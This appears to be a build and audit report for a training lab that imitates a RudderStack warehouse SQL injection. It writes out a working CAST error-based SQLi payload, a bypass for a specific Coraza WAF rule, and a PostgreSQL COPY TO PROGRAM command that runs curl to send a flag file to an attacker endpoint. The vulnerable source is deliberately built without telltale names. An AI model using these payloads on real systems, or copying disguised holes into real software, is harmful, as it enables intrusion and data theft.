# lab-77-pumice — RudderStack SQLi and Coraza WAF Bypass

## Frame

**Outcome:** Working L5 Node.js lab implementing the OSWE RudderStack lesson. Students exploit an unsanitized SQL query in a warehouse API endpoint, bypass a single Coraza WAF rule (942540) via payload manipulation, and achieve RCE via PostgreSQL COPY TO PROGRAM.

**Success line:** validate_labs.sh 0 FAIL; smoke_test.sh PASS; login not required; FLAG_LOCAL extractable via error-based CAST SQLi; FLAG_PROOF extractable via WAF bypass + COPY TO PROGRAM + curl to attacker endpoint.

**Kill line:** PostgreSQL COPY TO PROGRAM disabled by pg_hba or permissions issue.

**Proof:** 71/71 validate_labs.sh PASS; smoke_test.sh PASS; both flag extraction methods verified end-to-end.

---

## Work

### Application: Warehouse API

Node.js 18 + PostgreSQL 15 in a single container. Simulates RudderStack v1.2.5 warehouse sync endpoint.

**Key files:**
- `app.js` — Express server; WAF middleware enforcing rule 942540 regex; `POST /v1/warehouse/pending-events` with string-interpolated SQL; attacker exfil endpoints
- `init.sql` — creates `wh_uploads` (seeded with realistic rows) and `flags` tables
- `entrypoint.sh` — starts postgres as postgres user, creates DB, runs init.sql, updates flags table with real FLAG_LOCAL env value, then execs node

**Attack flow:**
1. `POST /v1/warehouse/pending-events` with `{"source_id": "x' AND 1=CAST((SELECT flag_value FROM flags LIMIT 1) AS INTEGER) -- -"}` → Postgres CAST error leaks FLAG_LOCAL
2. WAF blocks `'` immediately followed by whitespace+`;` via regex `^(?:[^']*'|[^"]*"|[^`]*`)[\s\v]*;`
3. Bypass: insert `or 1=2` between quote and semicolon: `x' or 1=2; COPY (SELECT 'a') TO PROGRAM 'curl -g http://127.0.0.1:5000/attacker/collect?data=$(cat /flag_proof.txt)' -- -`
4. `GET /api/attacker/results` returns collected FLAG_PROOF

**curl globoff quirk:** `curl` treats `{...}` in URLs as globs; `-g`/`--globoff` disables this and is required to receive the full `ARENA{...}` flag value.

### Constraints respected

- No comments in any source files
- No variable names containing vuln/exploit/unsafe/etc.
- No payloads or walkthroughs in source

---

## Audit

- validate_labs.sh: 71/71 PASS
- smoke_test.sh: PASS
- FLAG_LOCAL via CAST error-based SQLi: `ARENA{test_local_123}` in error response ✓
- WAF block (naive `' ;` payload): 403 ✓
- FLAG_PROOF via WAF bypass + COPY TO PROGRAM + curl -g: `ARENA{test_proof_456}` in attacker results ✓

**Confidence:** High. Both flag extraction methods verified with live flag values.
